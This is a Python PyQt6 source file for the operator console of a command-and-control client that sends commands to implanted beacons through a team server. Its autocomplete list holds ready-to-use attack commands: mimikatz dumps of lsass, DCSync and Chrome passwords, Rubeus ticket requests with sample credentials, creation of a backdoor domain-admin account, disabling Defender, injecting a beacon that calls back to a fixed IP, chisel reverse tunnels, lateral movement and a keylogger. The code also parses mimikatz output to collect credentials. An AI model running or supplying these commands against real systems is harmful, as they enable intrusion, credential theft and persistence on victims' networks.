import os
import time
import re, html
import uuid
import json
import logging
from datetime import datetime

from PyQt6.QtCore import QObject, Qt, QEvent, QThread, QTimer, pyqtSignal
from PyQt6.QtGui import QStandardItem, QStandardItemModel, QTextCursor, QTextDocument, QShortcut
from PyQt6.QtWidgets import (
    QWidget,
    QTabWidget,
    QVBoxLayout,
    QHBoxLayout,
    QTextEdit,
    QLineEdit,
    QCompleter,
    QCheckBox,
    QLabel,
    QPushButton,
)

from .grpcClient import TeamServerApi_pb2
from .TerminalPanel import Terminal
from .ScriptPanel import Script
from .AssistantPanel import Assistant
from .TerminalModules.Credentials import credentials
from .console_style import (
    CONSOLE_COLORS,
    apply_console_output_style,
    console_header_html,
    console_pre_html,
    console_status_html,
    move_editor_to_end,
)
from .env import env_path
from .grpc_status import is_response_ok, response_message

logger = logging.getLogger(__name__)
CONSOLE_EVENT_PREFIX = "[console] "


#
# Log
#
configuredLogsDir = env_path("C2_LOG_DIR")
if configuredLogsDir:
    logsDir = str(configuredLogsDir)
else:
    try:
        import pkg_resources
        logsDir = pkg_resources.resource_filename(
            'C2Client',
            'logs'
        )

    except ImportError:
        logsDir = os.path.join(os.path.dirname(__file__), 'logs')

if not os.path.exists(logsDir):
    os.makedirs(logsDir)

#
# Constant
#
TerminalTabTitle = "Terminal"
CmdHistoryFileName = ".cmdHistory"

HelpInstruction = "help"
SleepInstruction = "sleep"
EndInstruction = "end"
ListenerInstruction = "listener"
LoadModuleInstruction = "loadModule"

AssemblyExecInstruction = "assemblyExec"
UploadInstruction = "upload"
RunInstruction = "run"
DownloadInstruction = "download"
InjectInstruction = "inject"
ScriptInstruction = "script"
PwdInstruction = "pwd"
CdInstruction = "cd"
LsInstruction = "ls"
PsInstruction = "ps"
CatInstruction = "cat"
TreeInstruction = "tree"
MakeTokenInstruction = "makeToken"
Rev2selfInstruction = "rev2self"
StealTokenInstruction = "stealToken"
CoffLoaderInstruction = "coffLoader"
UnloadModuleInstruction = "unloadModule"
KerberosUseTicketInstruction = "kerberosUseTicket"
PowershellInstruction = "powershell"
ChiselInstruction = "chisel"
PsExecInstruction = "psExec"
WmiInstruction = "wmiExec"
SpawnAsInstruction = "spawnAs"
EvasionInstruction = "evasion"
KeyLoggerInstruction = "keyLogger"
MiniDumpInstruction = "miniDump"
DotnetExecInstruction = "dotnetExec"

StartInstruction = "start"
StopInstruction = "stop"

completerData = [
    (HelpInstruction,[]),
    (SleepInstruction,[]),
    (EndInstruction,[]),
    (ListenerInstruction,[
            (StartInstruction+' smb pipename',[]),
            (StartInstruction+' tcp 127.0.0.1 4444',[]),
            (StopInstruction,  []),
             ]),
    (AssemblyExecInstruction,[
                        ('-e',[
                            ('mimikatz.exe',[
                                ('"!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',[]),
                                ('"privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',[]),
                                ('"privilege::debug" "lsadump::lsa /inject /name:joe" "exit"',[]),
                                ('"sekurlsa::logonpasswords" "exit"',  []),
                                ('"sekurlsa::ekeys" "exit"',  []),
                                ('"lsadump::sam" "exit"',  []),
                                ('"lsadump::cache" "exit"',  []),
                                ('"lsadump::secrets" "exit"',  []),
                                ('"dpapi::chrome /in:"""C:\\Users\\CyberVuln\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"""" "exit"', []),
                                ('"dpapi::cred /in:C:\\Users\\joe\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D" "exit"', []),
                                ('"sekurlsa::dpapi" "exit"',  []),
                                ('"dpapi::masterkey /in:C:\\Users\\joe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-308422719-809814085-1049341588-1001/36bf2476-ed68-4bf9-9604-c84a6e8bcb03 /rpc" "exit"',  []),
                            ]),
                            
                            ('SharpView.exe Get-DomainComputer',  []),
                            ('Rubeus.exe',[
                                ('triage',[]),
                                ('purge',[]),
                                ('asktgt /user:OFFSHORE_ADM /password:Banker!123 /domain:client.offshore.com /nowrap /ptt',  []),
                                ('s4u /user:MS02$ /aes256:a7ef524856fbf9113682384b725292dec23e54ab4e66cfdca8dd292b1bb198ae /impersonateuser:administrator /msdsspn:cifs/dc04.client.OFFSHORE.COM /altservice:host /nowrap /ptt',  []),
                            ]),
                            ('Seatbelt.exe',[
                                ('-group=system',[]),
                                ('-group=user',[]),
                            ]),
                            ('SharpHound.exe -c All -d dev.admin.offshore.com',  []),
                            ('SweetPotato.exe -e EfsRpc -p C:\\Users\\Public\\Documents\\implant.exe',  []),
                        ]),
                    ]),
    (UploadInstruction,[]),
    (RunInstruction,[
             ('cmd /c',  []),
             ('cmd /c sc query',  []),
             ('cmd /c wmic service where caption="Serviio" get name, caption, state, startmode',  []),
             ('cmd /c where /r c:\\ *.txt',  []),
             ('cmd /c tasklist /SVC',  []),
             ('cmd /c taskkill /pid 845 /f',  []),
             ('cmd /c schtasks /query /fo LIST /v',  []),
             ('cmd /c net user superadmin123 Password123!* /add',  []),
             ('cmd /c net localgroup administrators superadmin123 /add',  []),
             ('cmd /c net user superadmin123 Password123!* /add /domain',  []),
             ('cmd /c net group "domain admins" superadmin123 /add /domain',  []),
             ]),
    (DownloadInstruction,[]),
    (InjectInstruction,[
                ('-e BeaconHttp.exe -1 10.10.15.34 8443 https',  []),
                ('-e implant.exe -1',  []),
    ]),
    (ScriptInstruction,[]),
    (PwdInstruction,[]),
    (CdInstruction,[]),
    (LsInstruction,[]),
    (PsInstruction,[]),
    (CatInstruction,[]),
    (TreeInstruction,[]),
    (MakeTokenInstruction,[]),
    (Rev2selfInstruction,[]),
    (StealTokenInstruction,[]),
    (CoffLoaderInstruction,[
        ('adcs_enum.x64.o', [('go',[])]),
        ('adcs_enum_com.x64.o', [('go ZZ hostname sharename',[])]),
        ('adcs_enum_com2.x64.o', [('go',[])]),
        ('adv_audit_policies.x64.o', [('go',[])]),
        ('arp.x64.o', [('go',[])]),
        ('cacls.x64.o', [('go zz hostname servicename',[])]),
        ('dir.x64.o', [('go Zs targetdir subdirs',[])]),
        ('driversigs.x64.o', [('go Zi name, 0',[])]),
        ('enum_filter_driver.x64.o', [('go',[])]),
        ('enumlocalsessions.x64.o', [('go zz modname procname',[])]),
        ('env.x64.o', [('go',[])]),
        ('findLoadedModule.x64.o', [('go',[])]),
        ('get-netsession.x64.o', [('go',[])]),
        ('get_password_policy.x64.o', [('go Z server',[])]),
        ('ipconfig.x64.o', [('go',[])]),
        ('ldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
        ('listdns.x64.o', [('go',[])]),
        ('listmods.x64.o', [('go i pid',[])]),
        ('locale.x64.o', [('go',[])]),
        ('netgroup.x64.o', [('go sZZ type server group',[])]),
        ('netlocalgroup.x64.o', [('go',[])]),
        ('netshares.x64.o', [('go Zi name, 1',[])]),
        ('netstat.x64.o', [('go',[])]),
        ('netuse.x64.o', [('go sZZZZss 1 share user password device persist requireencrypt',[])]),
        ('netuser.x64.o', [('go ZZ 2 domain',[])]),
        ('netuserenum.x64.o', [('go',[])]),
        ('netview.x64.o', [('go Z domain',[])]),
        ('nonpagedldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
        ('nslookup.x64.o', [('go zzs lookup server type',[])]),
        ('probe.x64.o', [('go zi host port',[])]),
        ('reg_query.x64.o', [('go zizzi hostname hive path key, 0',[])]),
        ('resources.x64.o', [('go',[])]),
        ('routeprint.x64.o', [('go',[])]),
        ('sc_enum.x64.o', [('go',[])]),
        ('schtasksenum.x64.o', [('go ZZ 2 3',[])]),
        ('schtasksquery.x64.o', [('go',[])]),
        ('sc_qc.x64.o', [('go zz hostname servicename',[])]),
        ('sc_qdescription.x64.o', [('go zz hostname servicename',[])]),
        ('sc_qfailure.x64.o', [('go',[])]),
        ('sc_qtriggerinfo.x64.o', [('go',[])]),
        ('sc_query.x64.o', [('go',[])]),
        ('tasklist.x64.o', [('go Z system',[])]),
        ('uptime.x64.o', [('go',[])]),
        ('vssenum.x64.o', [('go',[])]),
        ('whoami.x64.o', [('go',[])]),
        ('windowlist.x64.o', [('go',[])]),
        ('wmi_query.x64.o', [('go ZZZ system namespace query',[])]),
    ]),
    (MiniDumpInstruction,  [
        ('dump dump.xor',  []),
        ('decrypt /tmp/dump.xor',  []),
    ]),
    (DotnetExecInstruction,  [
        ('load rub Rubeus.exe',  []),
        ('runExe rub help',  []),
    ]),
    (UnloadModuleInstruction,[
             (AssemblyExecInstruction, []),
             (CdInstruction, []),
             (CoffLoaderInstruction, []),
             (DownloadInstruction, []),
             (InjectInstruction, []),
             (LsInstruction, []),
             (PsInstruction, []),
             (MakeTokenInstruction, []),
             (PwdInstruction, []),
             (Rev2selfInstruction, []),
             (RunInstruction, []),
             (ScriptInstruction, []),
             (StealTokenInstruction, []),
             (UploadInstruction,  []),
             (PowershellInstruction,  []),
             (PsExecInstruction,  []),
             (KerberosUseTicketInstruction,  []),
             (ChiselInstruction,  []),
             (EvasionInstruction,  []),
             (SpawnAsInstruction,  []),
             (WmiInstruction,  []),
             (KeyLoggerInstruction,  []),
             (MiniDumpInstruction,  []),
             (DotnetExecInstruction,  []),
             ]),
    (KerberosUseTicketInstruction,[]),
    (PowershellInstruction,[
                ('-i PowerView.ps1',  []),
                ('Get-Domain',  []),
                ('Get-DomainTrust',  []),
                ('Get-DomainUser',  []),
                ('Get-DomainComputer -Properties DnsHostName',  []),
                ('powershell Get-NetSession -ComputerName MS01 | select CName, UserName',  []),
                ('-i PowerUp.ps1',  []),
                ('Invoke-AllChecks',  []),
                ('-i Powermad.ps1',  []),
                ('-i PowerUpSQL.ps1',  []),
                ('Set-MpPreference -DisableRealtimeMonitoring $true',  []),
                ]),
    (ChiselInstruction,[
                ('status',  []),
                ('stop',  []),
                ('chisel.exe client 192.168.57.21:9001 R:socks',  []),
                ('chisel.exe client 192.168.57.21:9001 R:445:192.168.57.14:445',  []),
                ]),
    (PsExecInstruction,[
        ('10.10.10.10 implant.exe',  []),
    ]),
    (WmiInstruction,[
        ('10.10.10.10 implant.exe',  []),
    ]),
    (SpawnAsInstruction,[
        ('user password implant.exe',  []),
    ]),
    (EvasionInstruction,[
        ('CheckHooks',  []),
        ('Unhook',  []),
    ]),
    (KeyLoggerInstruction,[
        ('start',  []),
        ('stop',  []),
        ('dump',  []),
    ]),
    (LoadModuleInstruction,[
             ('changeDirectory', []),
             ('listDirectory', []),
             ('listProcesses', []),
             ('printWorkingDirectory', []),
             (CdInstruction, []),
             (LsInstruction, []),
             (PsInstruction, []),
             (PwdInstruction, []),
             (AssemblyExecInstruction, []),
             (CoffLoaderInstruction, []),
             (DownloadInstruction, []),
             (InjectInstruction, []),
             (MakeTokenInstruction, []),
             (Rev2selfInstruction, []),
             (RunInstruction, []),
             (ScriptInstruction, []),
             (StealTokenInstruction, []),
             (UploadInstruction,  []),
             (PowershellInstruction,  []),
             (PsExecInstruction,  []),
             (KerberosUseTicketInstruction,  []),
             (ChiselInstruction,  []),
             (EvasionInstruction,  []),
             (SpawnAsInstruction,  []),
             (WmiInstruction,  []),
             (KeyLoggerInstruction,  []),
             (MiniDumpInstruction,  []),
             (DotnetExecInstruction,  []),
             ]),
]


#
# Fix console rendering
#
# Regexes
SGR_RE = re.compile(r'\x1b\[([0-9;]*)m')  # keep these for color -> HTML
OSC_RE = re.compile(r'\x1b\].*?(?:\x07|\x1b\\)', re.DOTALL)  # OSC ... BEL/ST
# Any CSI (ESC [ ... finalbyte), we'll later keep only the ones ending with 'm'
CSI_RE = re.compile(r'\x1b\[[0-?]*[ -/]*[@-~]')
# Single-char ESC sequences:
#  - ESC= / ESC> / ESC<  (keypad/app mode toggles)
#  - ESC @ .. ESC _      (misc single ESCs)
ESC_SINGLE_RE = re.compile(r'\x1b(?:[@-Z\\-_]|[=><])')

def normalize_cr(text: str) -> str:
    text = text.replace('\r\n', '\n')
    # treat stray CR as newline (instead of overwriting behavior)
    return re.sub(r'\r(?!\n)', '\n', text)

def apply_backspaces(text: str) -> str:
    out = []
    for ch in text:
        if ch == '\b':
            if out: out.pop()
        else:
            out.append(ch)
    return ''.join(out)

def strip_non_sgr_ansi(text: str) -> str:
    # 1) remove OSC
    text = OSC_RE.sub('', text)

    # 2) remove *non*-SGR CSI (keep those ending with 'm')
    def _keep_only_sgr(m):
        s = m.group(0)
        return s if s.endswith('m') else ''  # drop everything except SGR
    text = CSI_RE.sub(_keep_only_sgr, text)

    # 3) remove single-byte ESC sequences (ESC=, ESC>, ESCc, ESC(0, ESC)B, etc.)
    text = ESC_SINGLE_RE.sub('', text)

    return text

# Minimal SGR -> HTML
_BASE  = ['#000','#a00','#0a0','#a50','#00a','#a0a','#0aa','#aaa']
_BRIGHT= ['#555','#f55','#5f5','#ff5','#55f','#f5f','#5ff','#fff']

def _style_css(state):
    css=[]
    if state.get('bold'): css.append('font-weight:bold')
    if state.get('underline'): css.append('text-decoration:underline')
    if state.get('fg'): css.append(f"color:{state['fg']}")
    if state.get('bg'): css.append(f"background-color:{state['bg']}")
    return ';'.join(css)

def ansi_to_html(text: str) -> str:
    txt = html.escape(text)
    out=[]; pos=0; state={}; open_span=False
    for m in SGR_RE.finditer(txt):
        if m.start() > pos:
            chunk = txt[pos:m.start()].replace('\n','<br/>')
            if _style_css(state):
                if not open_span:
                    out.append(f'<span style="{_style_css(state)}">'); open_span=True
            out.append(chunk)
        pos = m.end()
        params = m.group(1)
        codes = [0] if params=='' else [int(c or 0) for c in params.split(';')]

        for c in codes:
            if c==0: state.clear()
            elif c==1: state['bold']=True
            elif c==4: state['underline']=True
            elif 30<=c<=37: state['fg']=_BASE[c-30]
            elif 90<=c<=97: state['fg']=_BRIGHT[c-90]
            elif 40<=c<=47: state['bg']=_BASE[c-40]
            elif 100<=c<=107: state['bg']=_BRIGHT[c-100]
            elif c==39: state.pop('fg',None)
            elif c==49: state.pop('bg',None)

        if open_span: out.append('</span>'); open_span=False
        if _style_css(state): out.append(f'<span style="{_style_css(state)}">'); open_span=True

    if pos < len(txt):
        chunk = txt[pos:].replace('\n','<br/>')
        if _style_css(state) and not open_span:
            out.append(f'<span style="{_style_css(state)}">'); open_span=True
        out.append(chunk)
    if open_span: out.append('</span>')
    return ''.join(out)
        

#
# Consoles Tab Implementation
#
class ConsolesTab(QWidget):
    
    def __init__(self, parent, grpcClient):
        super(QWidget, self).__init__(parent)
        self.setObjectName("C2ConsolesTab")
        self.setStyleSheet(
            f"""
            QWidget#C2ConsolesTab,
            QWidget#C2ConsolePage {{
                background-color: {CONSOLE_COLORS["background"]};
            }}
            QTabWidget#C2ConsoleTabs {{
                background-color: #070b10;
                border: 0;
            }}
            QTabWidget#C2ConsoleTabs::pane {{
                background-color: {CONSOLE_COLORS["background"]};
                border: 1px solid {CONSOLE_COLORS["border"]};
                top: -1px;
            }}
            QTabWidget#C2ConsoleTabs QStackedWidget {{
                background-color: {CONSOLE_COLORS["background"]};
                border: 0;
            }}
            QTabWidget#C2ConsoleTabs QTabBar {{
                background-color: #070b10;
            }}
            """
        )
        self.layout = QHBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)
        self.layout.setSpacing(0)
        
        # Initialize tab screen
        self.tabs = QTabWidget(self)
        self.tabs.setObjectName("C2ConsoleTabs")
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.closeTab) 
                
        # Add tabs to widget
        self.layout.addWidget(self.tabs)

        self.grpcClient = grpcClient

        self.terminal = Terminal(self, self.grpcClient)
        tab = self.createConsolePage(self.terminal)
        self.tabs.addTab(tab, TerminalTabTitle)
        self.tabs.setCurrentIndex(self.tabs.count()-1)

        self.script = Script(self, self.grpcClient)
        tab = self.createConsolePage(self.script)
        self.tabs.addTab(tab, "Hooks")
        self.tabs.setCurrentIndex(self.tabs.count()-1)

        self.assistant = Assistant(self, self.grpcClient)
        tab = self.createConsolePage(self.assistant)
        self.tabs.addTab(tab, "Data AI")
        self.tabs.setCurrentIndex(self.tabs.count()-1)

    def createConsolePage(self, child):
        tab = QWidget()
        tab.setObjectName("C2ConsolePage")
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        layout.addWidget(child)
        return tab
        
    def addConsole(self, beaconHash, listenerHash, hostname, username):
        tabAlreadyOpen=False
        for idx in range(0,self.tabs.count()):
            openTabKey = self.tabs.tabText(idx)
            if openTabKey==beaconHash[0:8]:
                self.tabs.setCurrentIndex(idx)
                tabAlreadyOpen=True

        if tabAlreadyOpen==False:
            console = Console(self, self.grpcClient, beaconHash, listenerHash, hostname, username)
            console.consoleScriptSignal.connect(self.script.consoleScriptMethod)
            console.consoleScriptSignal.connect(self.assistant.consoleAssistantMethod)
            tab = self.createConsolePage(console)
            self.tabs.addTab(tab, beaconHash[0:8])
            self.tabs.setCurrentIndex(self.tabs.count()-1)

    def closeTab(self, currentIndex):
        currentQWidget = self.tabs.widget(currentIndex)
        if currentIndex<3:
            return
        currentQWidget.deleteLater()
        self.tabs.removeTab(currentIndex)


class Console(QWidget):

    consoleScriptSignal = pyqtSignal(str, str, str, str, str, str, str)

    tabPressed = pyqtSignal()
    beaconHash=""
    hostname=""
    username=""
    logFileName=""
    listenerHash=""

    def __init__(self, parent, grpcClient, beaconHash, listenerHash, hostname, username):
        super(QWidget, self).__init__(parent)
        self.layout = QVBoxLayout(self)

        self.grpcClient = grpcClient

        self.beaconHash=beaconHash
        self.listenerHash=listenerHash
        self.hostname=hostname.replace("\\", "_").replace(" ", "_")
        self.username=username.replace("\\", "_").replace(" ", "_")
        self.logFileName=self.hostname+"_"+self.username+"_"+self.beaconHash+".log"
        self.lastCommandLine = ""
        self.commandStatusById = {}
        self.renderedResponseIds = set()

        self.searchInput = QLineEdit()
        self.searchInput.setPlaceholderText("Search output")
        self.searchInput.returnPressed.connect(self.findNextSearchMatch)

        self.findPreviousButton = QPushButton("Prev")
        self.findPreviousButton.clicked.connect(
            lambda _checked=False: self.findNextSearchMatch(backward=True)
        )
        self.findNextButton = QPushButton("Next")
        self.findNextButton.clicked.connect(
            lambda _checked=False: self.findNextSearchMatch()
        )
        self.clearOutputButton = QPushButton("Clear")
        self.clearOutputButton.clicked.connect(self.clearConsoleOutput)
        self.exportLogButton = QPushButton("Export")
        self.exportLogButton.clicked.connect(self.exportConsoleOutput)
        self.resendButton = QPushButton("Resend")
        self.resendButton.clicked.connect(self.resendLastCommand)
        self.pauseAutoscrollCheckBox = QCheckBox("Pause scroll")
        self.pauseAutoscrollCheckBox.toggled.connect(self.onAutoscrollToggled)
        self.consoleNoticeLabel = QLabel("")
        self.consoleNoticeLabel.setMinimumWidth(180)
        self.consoleNoticeLabel.setAlignment(Qt.AlignmentFlag.AlignRight | Qt.AlignmentFlag.AlignVCenter)

        toolbarLayout = QHBoxLayout()
        toolbarLayout.addWidget(self.searchInput, 3)
        toolbarLayout.addWidget(self.findPreviousButton)
        toolbarLayout.addWidget(self.findNextButton)
        toolbarLayout.addWidget(self.clearOutputButton)
        toolbarLayout.addWidget(self.exportLogButton)
        toolbarLayout.addWidget(self.resendButton)
        toolbarLayout.addWidget(self.pauseAutoscrollCheckBox)
        toolbarLayout.addWidget(self.consoleNoticeLabel, 2)
        self.layout.addLayout(toolbarLayout)

        self.editorOutput = QTextEdit()
        self.editorOutput.setReadOnly(True)
        self.editorOutput.setAcceptRichText(True)
        apply_console_output_style(self.editorOutput)
        self.layout.addWidget(self.editorOutput, 8)
        self.loadConsoleLog()

        self.commandEditor = CommandEditor()
        self.layout.addWidget(self.commandEditor, 2)
        self.commandEditor.returnPressed.connect(self.runCommand)

        # Thread to get sessions response
        # https://realpython.com/python-pyqt-qthread/
        self.thread = QThread()
        self.getSessionResponse = GetSessionResponse()
        self.getSessionResponse.moveToThread(self.thread)
        self.thread.started.connect(self.getSessionResponse.run)
        self.getSessionResponse.checkin.connect(self.displayResponse)
        self.thread.start()

    def __del__(self):
        self.getSessionResponse.quit()
        self.thread.quit()
        self.thread.wait()

    def nextCompletion(self):
        index = self._compl.currentIndex()
        self._compl.popup().setCurrentIndex(index)
        start = self._compl.currentRow()
        if not self._compl.setCurrentRow(start + 1):
            self._compl.setCurrentRow(0)

    def event(self, event):
        if event.type() == QEvent.Type.KeyPress and event.key() == Qt.Key.Key_Tab:
            self.tabPressed.emit()
            return True
        return super().event(event)

    def setConsoleNotice(self, message, is_error=False):
        self.consoleNoticeLabel.setText(message)
        color = CONSOLE_COLORS["error"] if is_error else CONSOLE_COLORS["muted"]
        self.consoleNoticeLabel.setStyleSheet(f"color: {color};")

    def findNextSearchMatch(self, backward=False):
        search_text = self.searchInput.text().strip()
        if search_text == "":
            self.setConsoleNotice("Search term required.", True)
            return False

        original_cursor = self.editorOutput.textCursor()
        flags = QTextDocument.FindFlag.FindBackward if backward else QTextDocument.FindFlag(0)
        if self.editorOutput.find(search_text, flags):
            self.setConsoleNotice("Match found.")
            return True

        cursor = self.editorOutput.textCursor()
        if backward:
            cursor.movePosition(QTextCursor.MoveOperation.End)
        else:
            cursor.movePosition(QTextCursor.MoveOperation.Start)
        self.editorOutput.setTextCursor(cursor)

        if self.editorOutput.find(search_text, flags):
            self.setConsoleNotice("Search wrapped.")
            return True

        self.editorOutput.setTextCursor(original_cursor)
        self.setConsoleNotice("No match.", True)
        return False

    def clearConsoleOutput(self):
        self.editorOutput.clear()
        self.setConsoleNotice("Output cleared.")

    def exportConsoleOutput(self):
        os.makedirs(logsDir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        base_name = os.path.splitext(self.logFileName)[0]
        output_path = os.path.join(logsDir, f"{base_name}_console_{timestamp}.log")
        with open(output_path, "w", encoding="utf-8") as exportFile:
            exportFile.write(self.editorOutput.toPlainText().rstrip())
            exportFile.write("\n")
        self.setConsoleNotice("Exported " + os.path.basename(output_path))
        return output_path

    def onAutoscrollToggled(self, checked):
        if checked:
            self.setConsoleNotice("Autoscroll paused.")
            return
        self.setConsoleNotice("Autoscroll enabled.")
        self.setCursorEditorAtEnd(force=True)

    def isAutoscrollPaused(self):
        return self.pauseAutoscrollCheckBox.isChecked()

    def _shortCommandId(self, command_id):
        return (command_id or "unknown")[:8]

    def _shortText(self, text, limit=90):
        text = " ".join(str(text or "").split())
        if len(text) <= limit:
            return text
        return text[:limit - 3] + "..."

    def consoleLogPath(self):
        return os.path.join(logsDir, self.logFileName)

    def appendConsoleEvent(self, event, **payload):
        os.makedirs(logsDir, exist_ok=True)
        eventPayload = {
            "event": event,
            "timestamp": datetime.now().strftime("%Y:%m:%d %H:%M:%S"),
            **payload,
        }
        with open(self.consoleLogPath(), "a", encoding="utf-8") as logFile:
            logFile.write(CONSOLE_EVENT_PREFIX)
            logFile.write(json.dumps(eventPayload, sort_keys=True))
            logFile.write("\n")

    def loadConsoleLog(self):
        path = self.consoleLogPath()
        if not os.path.exists(path):
            return

        loadedEvents = 0
        with open(path, encoding="utf-8", errors="replace") as logFile:
            for line in logFile:
                if not line.startswith(CONSOLE_EVENT_PREFIX):
                    continue
                rawPayload = line[len(CONSOLE_EVENT_PREFIX):].strip()
                try:
                    eventPayload = json.loads(rawPayload)
                except json.JSONDecodeError:
                    continue
                if self.renderConsoleEvent(eventPayload):
                    loadedEvents += 1

        if loadedEvents:
            self.setConsoleNotice(f"Loaded {loadedEvents} log events.")
            self.setCursorEditorAtEnd(force=True)

    def renderConsoleEvent(self, eventPayload):
        status = eventPayload.get("event", "")
        if status not in {"queued", "done", "error"}:
            return False

        command_id = eventPayload.get("command_id", "")
        command = eventPayload.get("command", "")
        output = eventPayload.get("output", "")
        source = eventPayload.get("source", "")
        timestamp = eventPayload.get("timestamp", "")

        self.setCommandStatus(command_id, status, command, output if status == "error" else "")
        self.printCommandStatusInTerminal(command_id, status, command or output, timestamp=timestamp)
        if status in {"done", "error"} and output:
            self.printInTerminal("", "", output)
            if command_id and source != "ack":
                self.renderedResponseIds.add(command_id)
        return True

    def setCommandStatus(self, command_id, status, command_line="", message=""):
        if not command_id:
            return
        self.commandStatusById[command_id] = {
            "status": status,
            "command": command_line,
            "message": message,
            "updated_at": time.time(),
        }

        detail = self._shortText(command_line or message)
        notice = f"{status} {self._shortCommandId(command_id)}"
        if detail:
            notice += f" - {detail}"
        self.setConsoleNotice(notice, status == "error")

    def printCommandStatusInTerminal(self, command_id, status, message="", timestamp=None):
        tones = {
            "queued": "warning",
            "done": "success",
            "error": "error",
        }
        terminal_line = console_status_html(
            status,
            self._shortCommandId(command_id or "unknown"),
            self._shortText(message, 140),
            tone=tones.get(status, "info"),
            timestamp=timestamp,
        )
        self.editorOutput.insertHtml(terminal_line)
        self.editorOutput.insertPlainText("\n")

    def printInTerminal(self, cmdSent, cmdReived, result):
        if cmdSent:
            self.editorOutput.insertHtml(
                console_header_html(cmdSent, marker="[>>]", tone="command")
            )
            self.editorOutput.insertPlainText("\n")
        elif cmdReived:
            self.editorOutput.insertHtml(
                console_header_html(cmdReived, marker="[<<]", tone="response")
            )
            self.editorOutput.insertPlainText("\n")
        if result:

            s = normalize_cr(result)
            s = apply_backspaces(s)
            s = strip_non_sgr_ansi(s)
            # Convert remaining color SGR
            html_body = ansi_to_html(s)

            self.editorOutput.insertHtml(console_pre_html(html_body))
            self.editorOutput.insertHtml("<br/>")
            self.editorOutput.insertPlainText("\n")

    def resendLastCommand(self):
        if self.lastCommandLine == "":
            self.setConsoleNotice("No command to resend.", True)
            return
        self.executeCommand(self.lastCommandLine)

    def runCommand(self):
        commandLine = self.commandEditor.displayText()
        self.commandEditor.clearLine()
        self.executeCommand(commandLine)

    def executeCommand(self, commandLine):
        self.setCursorEditorAtEnd()

        if commandLine == "":
            self.printInTerminal("", "", "")
            self.setCursorEditorAtEnd()
            return

        self.lastCommandLine = commandLine

        with open(CmdHistoryFileName, 'a') as cmdHistoryFile:
            cmdHistoryFile.write(commandLine)
            cmdHistoryFile.write('\n')

        with open(os.path.join(logsDir, self.logFileName), 'a') as logFile:
            logFile.write('[+] send: \"' + commandLine + '\"')
            logFile.write('\n')

        self.commandEditor.setCmdHistory()
        instructions = commandLine.split()
        if instructions[0]==HelpInstruction:
            command = TeamServerApi_pb2.CommandHelpRequest(
                session=TeamServerApi_pb2.SessionSelector(
                    beacon_hash=self.beaconHash,
                    listener_hash=self.listenerHash,
                ),
                command=commandLine,
            )
            response = self.grpcClient.getCommandHelp(command)
            command_text = getattr(response, "command", commandLine) or commandLine
            self.printInTerminal(command_text, "", "")
            if is_response_ok(response):
                self.printInTerminal("", command_text, response.help)
            else:
                self.printInTerminal("", command_text, response_message(response, "No help available."))
            self.setCursorEditorAtEnd()
            return

        command_id = uuid.uuid4().hex
        command = TeamServerApi_pb2.SessionCommandRequest(
            session=TeamServerApi_pb2.SessionSelector(
                beacon_hash=self.beaconHash,
                listener_hash=self.listenerHash,
            ),
            command=commandLine,
            command_id=command_id,
        )
        result = self.grpcClient.sendSessionCommand(command)
        command_id = getattr(result, "command_id", command_id) or command_id
        if not is_response_ok(result):
            message = response_message(result, "Command was rejected by TeamServer.")
            self.setCommandStatus(command_id, "error", commandLine, message)
            self.printCommandStatusInTerminal(command_id, "error", commandLine)
            self.printInTerminal("", "", message)
            self.appendConsoleEvent(
                "error",
                command_id=command_id,
                command=commandLine,
                output=message,
                source="ack",
            )
            with open(os.path.join(logsDir, self.logFileName), 'a') as logFile:
                logFile.write('[+] rejected: \"' + commandLine + '\"')
                logFile.write('\n' + message + '\n')
            self.setCursorEditorAtEnd()
            return

        self.setCommandStatus(command_id, "queued", commandLine)
        self.printCommandStatusInTerminal(command_id, "queued", commandLine)
        self.appendConsoleEvent("queued", command_id=command_id, command=commandLine)
        context = "Host " + self.hostname + " - Username " + self.username
        self.consoleScriptSignal.emit("send", self.beaconHash, self.listenerHash, context, commandLine, "", command_id)
        ack_message = response_message(result)
        if ack_message:
            self.printInTerminal("", "", ack_message)

        self.setCursorEditorAtEnd()

    def displayResponse(self):
        session = TeamServerApi_pb2.SessionSelector(beacon_hash=self.beaconHash, listener_hash=self.listenerHash)
        responses = self.grpcClient.streamSessionCommandResults(session)
        for response in responses:
            context = "Host " + self.hostname + " - Username " + self.username
            command_id = getattr(response, "command_id", "")
            if command_id and command_id in self.renderedResponseIds:
                continue
            listener_hash = response.session.listener_hash or self.listenerHash
            command_text = response.command or response.instruction
            decoded_response = response.output.decode('utf-8', 'replace')
            response_ok = is_response_ok(response)
            if not response_ok:
                decoded_response = response_message(response) or decoded_response or "Command failed."
            self.consoleScriptSignal.emit("receive", self.beaconHash, listener_hash, context, command_text, decoded_response, command_id)
            # check the response for mimikatz and not the cmd line ???
            if "-e mimikatz.exe" in command_text:
                credentials.handleMimikatzCredentials(decoded_response, self.grpcClient, TeamServerApi_pb2)
            status = "done" if response_ok else "error"
            self.setCommandStatus(command_id, status, command_text, decoded_response if not response_ok else "")
            self.printCommandStatusInTerminal(command_id, status, command_text)
            self.printInTerminal("", "", decoded_response)
            if command_id:
                self.renderedResponseIds.add(command_id)
            self.appendConsoleEvent(
                status,
                command_id=command_id,
                command=command_text,
                output=decoded_response,
                source="response",
            )
            self.setCursorEditorAtEnd()

            with open(os.path.join(logsDir, self.logFileName), 'a') as logFile:
                logFile.write('[+] result: \"' + command_text + '\"')
                logFile.write('\n' + decoded_response  + '\n')
                logFile.write('\n')

    def setCursorEditorAtEnd(self, force=False):
        if not force and self.isAutoscrollPaused():
            return
        move_editor_to_end(self.editorOutput)
    

class GetSessionResponse(QObject):
    """Background worker querying session responses."""

    checkin = pyqtSignal()

    def __init__(self) -> None:
        super().__init__()
        self.exit = False

    def run(self) -> None:
        while not self.exit:
            self.checkin.emit()
